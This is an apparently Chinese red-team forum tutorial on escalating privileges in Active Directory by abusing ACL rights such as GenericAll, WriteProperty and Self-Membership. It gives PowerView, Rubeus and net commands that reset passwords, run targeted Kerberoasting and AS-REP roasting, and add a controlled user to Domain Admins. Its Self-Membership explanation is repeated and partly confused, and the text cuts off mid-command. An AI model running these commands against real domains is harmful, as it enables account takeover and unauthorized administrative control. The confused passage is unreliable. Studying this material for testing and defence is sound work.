---
title: 内网活动目录利用方法
url: https://forum.butian.net/share/3681
source: 奇安信攻防社区
date: 2024-08-27
fetch_date: 2025-10-06T18:02:44.413170
---

# 内网活动目录利用方法

#

[问答](https://forum.butian.net/questions)

*发起*

* [提问](https://forum.butian.net/question/create)
* [文章](https://forum.butian.net/share/create)

[攻防](https://forum.butian.net/community)
[活动](https://forum.butian.net/movable)

Toggle navigation

* [首页 (current)](https://forum.butian.net)
* [问答](https://forum.butian.net/questions)
* [商城](https://forum.butian.net/shop)
* [实战攻防技术](https://forum.butian.net/community)
* [漏洞分析与复现](https://forum.butian.net/articles)
  NEW
* [活动](https://forum.butian.net/movable)
* [摸鱼办](https://forum.butian.net/questions/Play)

搜索

* [登录](https://forum.butian.net/login)
* [注册](https://user.skyeye.qianxin.com/user/register?next=http://forum.butian.net/btlogin)

### 内网活动目录利用方法

* [渗透测试](https://forum.butian.net/topic/47)

内网活动目录利用方法

#### 滥用活动目录ACLs\\ACEs权限
<https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/acl-persistence-abuse>
[https://www.cnblogs.com/nice0e3/p/15879624.html](https://www.cnblogs.com/nice0e3/p/15879624.html#self-membership)
DACL和ACE是与访问控制相关的概念，常用于操作系统和网络环境中。以下是对它们的详细解释：
1. DACL（Discretionary Access Control List）：DACL是一种访问控制列表，用于确定谁可以访问特定对象（如文件、文件夹、注册表项等）。DACL是以访问控制条目（ACE）的形式组成的列表。
2. ACE（Access Control Entry）：ACE是DACL中的基本单元，用于授予或拒绝对对象的访问权限。每个ACE定义了一个安全主体（如用户、组、计算机等）以及该安全主体所具有的权限。
在DACL中，每个ACE包含以下信息：
- 安全主体（SID）：标识被授权或被拒绝访问权限的用户、组或计算机的唯一标识符。
- 访问权限：表示特定操作或权限（如读取、写入、执行等）。
- 访问掩码：指定了实际授予或拒绝的权限。
- 辅助访问掩码：在某些情况下，用于指定其他条件或限制。
当访问对象时，系统将根据DACL中的ACE进行验证。如果存在与用户身份匹配的ACE，并且该ACE授予了所请求的权限，访问将被允许。如果没有匹配的ACE，或者存在与用户身份匹配的ACE，但是该ACE拒绝了所请求的权限，访问将被拒绝。
域管理员的ACE如下
![](https://cdn.nlark.com/yuque/0/2023/png/21953116/1693967356544-dda54777-e97a-437b-aede-0ed40ba835e2.png)
其中，我们关注的权限为如下几条
- \*\*GenericAll\*\* - full rights to the object (add users to a group or reset user's password)
- \*\*GenericWrite\*\* - update object's attributes (i.e logon script)
- \*\*WriteOwner\*\* - change object owner to attacker controlled user take over the object
- \*\*WriteDACL\*\* - modify object's ACEs and give attacker full control right over the object
- \*\*AllExtendedRights\*\* - ability to add user to a group or reset password
- \*\*ForceChangePassword\*\* - ability to change user's password
- \*\*Self (Self-Membership)\*\* - ability to add yourself to a group
- GenericAll - 对对象拥有完全权限（例如添加用户到组或重置用户密码） 。
- GenericWrite - 更新对象的属性（例如登录脚本） 。
- WriteOwner - 修改对象的所有者为攻击者控制的用户，接管该对象 。
- WriteDACL - 修改对象的ACEs，并授予攻击者对该对象的全部控制权限 。
- AllExtendedRights - 能够添加用户到组或重置密码 。
- ForceChangePassword - 能够更改用户的密码 。
- Self（Self-Membership）- 能够将自己添加到组中。
- Self-Membership - 这条权限指的是某个账户能够把自身添加到某个组的权限(需要在某个组的高级权限中添加ACE，也就是说针对的是组对象），也就是说，某个对象在某个组中是Self-Membership身份。
##### GenericAll
###### 对用户账户的GenericAll权限
使用PowerView工具，查看用户的GenericAll权限。
> powershell -exec bypass
>
> Import-Module .\\PowerView.ps1
//获取用户man1的AD对象的访问控制列表（ACL）,筛选返回具有"GenericAll"权限的项
> Get-ObjectAcl -SamAccountName man1 -ResolveGUIDs | ? {$\\_.ActiveDirectoryRights -eq "GenericAll"}
可以看到spotless用户拥有对delegate的GenericAll权限，那么在已获得spotless用户权限的情况下，我们可以接管delegate用户。
![](https://cdn.nlark.com/yuque/0/2023/png/21953116/1693971387479-a9a53204-9193-4fcf-8f89-0147bd6fc592.png)
1. \*\*更改密码：\*\*直接修改delegate用户的密码即可。
> net user &lt;username&gt;&lt;password&gt; /domain
2. \*\*Kerberoasting攻击：\*\*给delegate用户设置SPN，然后通过spotless用户的TGT来请求所有服务的ST，获取到delegate用户的HASH加密的ST，进行破解。
\# Set SPN
> Set-DomainObject -Credential $creds -Identity &lt;username&gt; -Set @{serviceprincipalname="fake/NOTHING"}
\# Get Hash
> .\\Rubeus.exe kerberoast /user:&lt;username&gt; /nowrap
\# Clean SPN
> Set-DomainObject -Credential $creds -Identity &lt;username&gt; -Clear serviceprincipalname -Verbose
<https://github.com/ShutdownRepo/targetedKerberoast>
> python3 targetedKerberoast.py -domain.local -u &lt;username&gt; -p password -v
3. \*\*ASREProast攻击：\*\*可以通过禁用预身份验证来使用户ASREPRoastable ，然后对其进行 ASREProast攻击。
> Set-DomainObject -Identity &lt;username&gt; -XOR @{UserAccountControl=4194304}
###### 对用户组的GenericAll权限
//获取到domain admins组的distinguishedName值
> Get-NetGroup "domain admins"
![](https://cdn.nlark.com/yuque/0/2023/png/21953116/1693972163842-fd093ab7-1506-412c-8365-e29f35dc17b5.png)
//获取Domain Admins组的ACL
> Get-ObjectAcl -ResolveGUIDs | ? {$\\_.objectdn -eq " CN=Domain Admins,CN=Users,DC=vvvv1,DC=com"}
![](https://cdn.nlark.com/yuque/0/2023/png/21953116/1693972290136-2be3458d-d1e9-4116-9877-70a9fe502f1a.png)
发现spotless用户拥有对Domain Admins组的GenericAll权限，可以进行攻击。
将自己（用户spotless）或其他用户添加到Domain Admin组中。
> net group "domain admins" spotless /add /domain
也可以使用 Active Directory 或 PowerSploit 模块进行攻击。
\# with active directory module
> Add-ADGroupMember -Identity "domain admins" -Members spotless
\# with Powersploit
> Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"
###### 对机器账户或服务账户的GenericAll权限
1. 如果对机器账户或服务账户具有GenericAll权限或者GenericWrite权限，可以考虑使用基于资源的约束委派攻击，详情见《内网横向移动-基于资源的约束委派》；
2. 对于服务账户也可以考虑上文中的对用户账户的攻击方法；
3. 或者使用Shadow Credentials进行攻击；
\*\*影子凭证\*\*
<https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/acl-persistence-abuse/shadow-credentials>
<https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab>
<http://www.hackdig.com/02/hack-599160.htm>
<https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html>
##### WriteProperty
###### 对用户组的WriteProperty权限
我们的受控用户对domain admins组有WriteProperty权限。
![](https://cdn.nlark.com/yuque/0/2023/png/21953116/1693984352812-38aee3ea-fb6c-4165-adb2-ace77871ec78.png)
可以将该用户添加进入domain admins组来提升权限。
> powershell -exec bypass
>
> Import-Module .\\PowerView.ps1
>
> Add-NetGroupUser -UserName user -GroupName "domain admins" -Domain "vvvv1.com"
##### Self (Self-Membership)
###### 对用户组的Self (Self-Membership)权限
我们的受控用户对domain admins组有Self (Self-Membership)的权限。
![](https://cdn.nlark.com/yuque/0/2023/png/21953116/1693985234570-82daaf89-6186-4966-bd1a-cb688991b3f7.png)
这个权限也是可以将用户添加进入组的权限，可以将该用户添加进入domain admins组来提升权限。
> powershell -exec bypass
>
> Import-Module .\\PowerView.ps1
>
> Add-NetGroupUser -UserName user -GroupName "domain admins" -Domain "vvvv1.com"
"WriteProperty (Self-Membership)" 和 "Self (Self-Membership)" 都是与自成员（Self-Membership）相关的属性，但它们在含义上有所不同。
1. "WriteProperty (Self-Membership)": 这个属性表示对象能够写入（修改）自身的属性。通常情况下，对象只能修改其他对象的属性，而不能直接修改自己的属性。但当设置了"WriteProperty (Self-Membership)"属性时，对象就可以修改自己的属性。
2. "Self (Self-Membership)": 这个属性表示对象本身是其所在组或集合的成员。它与"WriteProperty (Self-Membership)"属性不同。"Self (Self-Membership)"属性表明对象本身是自己所在组或集合的一个成员，而"WriteProperty (Self-Membership)"属性则表明对象拥有修改自身属性的权限。
\*\*总结：也就是说，如果对象类型不是ALL，而是Self-Membership，那么就代表，我们查询的这个用户对象是属于这个用户组的。 其中"WriteProperty (Self-Membership)"属性赋予对象修改自身属性的权限，也就可以将该对象加入组；而"Self (Self-Membership)"属性指示对象本身是其所在组或集合的成员，也可以将该对象加入组。\*\*
##### WriteProperty (Self-Membership)
###### 对用户组的WriteProperty (Self-Membership)权限
我们的受控用户对domain admins组有WriteProperty (Self-Membership)的权限。
> Get-ObjectAcl -ResolveGUIDs | ? {$\\_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $\\_.IdentityReference -eq "OFFENSE\\spotless"}
![](https://cdn.nlark.com/yuque/0/2023/png/21953116/1693987399886-43954cac-4a8d-4850-b2bb-7d1db668a3b4.png)
这个权限也是可以将用户添加进入组的权限，可以将该用户添加进入domain admins组来提升权限。
> net group "domain admins" spotless /add /domain
"WriteProperty (Self-Membership)" 和 "Self (Self-Membership)" 都是与自成员（Self-Membership）相关的属性，但它们在含义上有所不同。
1. "WriteProperty (Self-Membership)": 这个属性表示对象能够写入（修改）自身的属性。通常情况下，对象只能修改其他对象的属性，而不能直接修改自己的属性。但当设置了"WriteProperty (Self-Membership)"属性时，对象就可以修改自己的属性。
2. "Self (Self-Membership)": 这个属性表示对象本身是其所在组或集合的成员。它与"WriteProperty (Self-Membership)"属性不同。"Self (Self-Membership)"属性表明对象本身是自己所在组或集合的一个成员，而"WriteProperty (Self-Membership)"属性则表明对象拥有修改自身属性的权限。
\*\*总结：也就是说，如果对象类型不是ALL，而是Self-Membership，那么就代表，我们查询的这个用户对象是属于这个用户组的。 其中"WriteProperty (Self-Membership)"属性赋予对象修改自身属性的权限，也就可以将该对象加入组；而"Self (Self-Membership)"属性指示对象本身是其所在组或集合的成员，也可以将该对象加入组。\*\*
##### ForceChangePassword
###### 对用户账户的ForceChangePassword权限
如果我们的所控账户在目标账户的ACL中为"User-Force-Change-Password"对象类型，且具有"ExtendedRight"权限，那么我们可以在不知道用户当前密码的情况下重置用户的密码。
> powershell -exec bypass
>
> Im...